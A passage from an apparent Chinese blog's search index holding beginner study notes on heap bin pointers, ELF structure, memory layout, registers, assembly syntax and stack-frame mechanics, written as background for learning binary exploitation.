+-------------------+\n\n\n4. 总结\nfd 和 bk 的指向规则：\n\n\n\n\n链表情形\nbin头.fd 指向\nbin头.bk 指向\n\n\n\n空链表\n&amp;bin头\n&amp;bin头\n\n\n单个 chunk\n第一个 chunk\n第一个 chunk\n\n\n多个 chunk\n第一个 chunk\n最后一个 chunk\n\n\n\n链表操作规则：\n\n插入：新 chunk 插入链表头部（bin头.fd 更新为新 chunk）。\n\n移除：从头部或尾部移除 chunk，保持双向链表的完整性。\n\n\n","categories":["堆"],"tags":["知识点"]},{"title":"二进制基础","url":"/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/","content":"一、程序的编译与链接从C源代码到可执行文件的生成过程 \n编译： 由C语言代码生成汇编代码 \n汇编： 由汇编代码生成机器码 \n链接 ：将多个机器码的目标文件链接成一个可执行文件\n\n​                                           C语言→汇编语言→机器码\n二、Linux下的可执行文件格式（1）什么是可执行文件？广义：文件中的数据是可执行文件 \n例：\n\n\n\n.out\n.exe\n.sh\n.py\n\n\n\n狭义：文件中的数据是机器码的文件 \n例：\n\n\n\n.out\n.exe\n.dll\n.so\n\n\n\n.out .exe .dl .so \n（2）可执行文件的分类Windows：PE\n\n\n\n可执行程序\n动态链接库\n静态链接库\n\n\n\n.exe\n.dll\n.lib\n\n\nLinux：ELF\n\n\n\n可执行程序\n动态链接库\n静态链接库\n\n\n\n.out\n.so\n.a\n\n\n（3）磁盘中的ELF与内存中的ELF磁盘中的储存方式：节\n内存中的储存方式：段\n\n\n\n\nRW可写 Data段\nRX可读 Code段\n\n\n\n.data\n.rodata\n\n\n.bss\n.text\n\n\n.got\n.int\n\n\n.plt\nELF  Header\n\n\n\n\n\nStack\nHeap\nFor Kernel\nSTACK\nHEAP\nDATA\nCODE\n\n\n\n用来管理函数调用的状态\n申请动态内存的调用\n操作系统代码\n栈段\n堆段\n数据段\n代码段\n\n\nvmmap：查看程序进程的内存空间\n注：数据从低地址向高地址写 Heap：是从低往高增长 Stack：是从高往低增长（栈的增长方向是相反的）\n三、进程虚拟地址空间\n（1）地址编码地址以字节编码，1Byte&#x3D;8bits，常以16进制表示\n（2）二进制与十六进制转换1.二进制转十六进制\n例：11010110\n从右往左每四位一组1101 0110，将二进制转换为十进制在对应为十六进制\n1101&#x3D;1×2³ + 1×2² + 0×2¹ + 1×2⁰ &#x3D;13&#x3D;D\n0110&#x3D;0×2³ + 1×2² + 1×2¹ + 0×2⁰&#x3D;6\n11010110&#x3D;D6\n2.十六进制转二进制\n例：2AF\n将每个十六进制的数转换为对应的四位二进制数，在组合起来\n2&#x3D;0010\nA&#x3D;10&#x3D;1010\nF&#x3D;15&#x3D;1111\n2AF&#x3D;0010 1010 1111\n（3）虚拟内存虚拟内存用户空间每个进程一份\n虚拟内存内核空间所有进程共享一份\n虚拟内存mmap段中的动态链接库仅在物理内存中装载一份\n（4）段（segment）与节（section）\n\n\n代码段（Text segment）\n数据段（Data segment）\n\n\n\n包含了代码与只读数据\n包含了可读可写数据\n\n\n.text 节\n.data 节\n\n\n.rodata 节\n.dynamic 节\n\n\n.hash 节\n.got 节\n\n\n.dynsym 节\n.got.plt 节（保存plt节解析出的函数的实际地址）\n\n\n.dynstr 节\n.bss 节 （只占用内存的空间不占用磁盘的空间）\n\n\n.plt 节（解析动态链接函数的实际地址）\n\n\n\n.rel.got 节\n\n\n\n（5）程序数据是如何在内存中组织的\nData段：放已经初始化的全局变量\nBss段：放未初始化的全局变量\nText段：除了防止代码还放只读数据（.rodata）\nHeap段：动态存储区\nStack段：存放局部变量（随着函数执行完被丢弃）\n注：x,y是形参，当main函数调用sum函数时才会被用到，只有参数传递的时候才会被使用\n32位架构：当main函数调用sum函数时，在创建sum函数的栈帧之前，将x和y的值压栈\n64位架构：x,y不会放在虚拟内存中，而是放在寄存器中\n（6）大端序与小端序\n小端序：低地址存放数据低位、高地址存放数据高位（大部分）\n\n大端序：低地址存放数据高位、高地址存放数据低位（小部分）\n注：在C语言中0x00是字符串的结束符，大部分情况数据高位都为0，大端序低地址存放高位数据，数据是从低地址向高地址写，当进行溢出时，从低地址写入遇到0x00就直接结束了，所以小端序比大端序更好利用。\n四、程序的装载与进程的执行（1）进程的执行过程\nPC寄存器（Register）：存放当前执行指令的地址（process count）\nx86 eip x64 rip \n（2）寄存器\namd64位寄存器结构\n\n\n\n名称\n大小\n\n\n\nrax\n8Bytes\n\n\neax\n4Bytes\n\n\nax\n2Bytes\n\n\nah\n1Bytes\n\n\nal\n1Bytes\n\n\n部分寄存器的功能\n\n\n\n名称\n功能\n\n\n\nRSP\n存放当前栈帧的栈顶地址\n\n\nRBP\n存放当前栈帧的栈底地址\n\n\nRAX\n通用寄存器存放函数返回值\n\n\nRIP\n存放当前执行的指令的地址\n\n\n（3）静态链接的程序的执行过程\nuser mode：用户代码          hernel mode：操作系统代码\n（4）动态链接的程序的执行过程\n五、x86&amp;amd64汇编简述（1）常用汇编指令\n\n\nMOV\nLEA\nPUSH\nPOP\nLEAVE\nRET\n\n\n\n把源操作数传送给目标\n把源操作数的有效地址送给指定的寄存器\n把目标值压栈，同时SP指针-1字长\n将栈顶的值弹出至目的存储位置，同时SP指针+1字长\n在函数返回时，恢复父函数栈帧的指令\n在函数返回时，控制程序执行流返回父函数的指令\n\n\n（2）两种汇编格式\n\n\nintel\nAT&amp;T\n\n\n\nmov eax, 8\nmovl $8, %eax\n\n\nmov ebx, 0ffffh\nmovl $0xffff, %ebx\n\n\nint 80h\nint $80\n\n\nmov eax, [ecx]\nmovl (%ecx), %eax\n\n\n\n","categories":["第一周"],"tags":["知识点"]},{"title":"栈溢出基础","url":"/2025/01/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/","content":"一、栈的介绍（1）栈的基本概念栈（Stack）：一种后进先出（LIFO）的数据结构，用于存储程序运行时的临时数据\n栈帧（Stack Frame）：每个函数调用时，栈会分配一个栈帧，用于存储函数的局部变量、参数、返回地址等信息\n栈指针（SP）：指向当前栈顶的指针，随着压栈（Push）和出栈（Pop）操作动态变化\n基指针（BP）：指向当前栈帧的底部，用于在栈帧中定位局部变量和参数\n指令指针（IP&#x2F;EIP&#x2F;RIP）：指向当前执行的指令地址，函数调用时会保存返回地址到栈中\n（2）栈的内存布局函数调用栈是程序运行时内存中一段连续的区域，用于保存函数运行时的状态信息。这些状态信息包括：\n函数参数：调用函数时传递给被调用函数的参数\n局部变量：被调用函数中定义的变量\n返回地址：被调用函数执行完毕后，程序需要返回的位置\n保存的寄存器值：某些情况下，函数会保存一些寄存器的值，以便在函数返回时恢复\n（3）栈的先进后出特性函数调用栈被称为“栈”，是因为它遵循后进先出的原则\n压栈（Push）：当发生函数调用时，调用函数（caller）的状态被保存到栈中，被调用函数（callee）的状态被压入栈顶。\n退栈（Pop）：当函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。\n（4）栈的生长方向在大多数系统中，函数调用栈在内存中是从高地址向低地址生长的\n压栈时：栈顶指针（SP）向低地址移动，栈顶对应的内存地址变小。\n退栈时：栈顶指针（SP）向高地址移动，栈顶对应的内存地址变大。\n二、 函数调用过程（1）参数传递的步骤1.逆序压栈\n调用函数（caller）按照逆序将参数依次压入栈中。这意味着最后一个参数先被压入栈，第一个参数最后被压入栈。\n例如，调用函数 callee(1，2，3) 时，参数的压栈顺序是3，2，1\npush 3    ; 第三个参数，实际是第一个一个压入栈push 2    ; 第二个参数push 1    ; 第一个参数，实际是最后一个压入栈\n\n2.参数保存\n这些参数被压入栈后，会保存在调用函数（caller）的栈帧中。此时，调用函数的栈帧仍然包含这些参数\n3.被调用函数的状态保存\n在参数压栈之后，调用函数会将控制权交给被调用函数（callee）。此时，被调用函数会创建自己的栈帧，并将这些参数视为自己的输入\n（2）栈帧的切换当被调用函数（callee）开始执行时，栈帧的切换过程如下：\n1.保存返回地址\n当调用函数使用 call 指令调用被调用函数时，call 指令会自动将调用函数的下一条指令的地址（即返回地址）压入栈中\ncall callee  ; 调用 callee 函数\n\n2.创建被调用函数的栈帧\n被调用函数（callee）会创建自己的栈帧，包括保存的寄存器值（也就是调用函数的基地址）、局部变量等\n被调用函数会从栈中读取参数，并在自己的栈帧中使用这些参数\npush ebp       ; 保存调用者的基地址mov ebp, esp   ; 建立被调用者的基地址\n\n3.执行被调用函数\n被调用函数执行其逻辑，操作局部变量和参数\n\n4.清理栈帧\n被调用函数执行完毕后，清理自己的栈帧，释放局部变量占用的空间\n返回地址从栈中弹出，存储到指令指针（IP&#x2F;EIP&#x2F;RIP）中，程序跳回调用函数的下一条指令\nmov esp, ebp  ; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间pop ebp       ; 恢复调用者的基地址    ret           ; 从栈中弹出返回地址并跳转到该地址\n\n注：\nx86\n使用栈来传递参数使用 eax 存放返回值\namd64\n前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中第7个以后的参数存放于栈中\n","categories":["第一周"],"tags":["知识点"]}]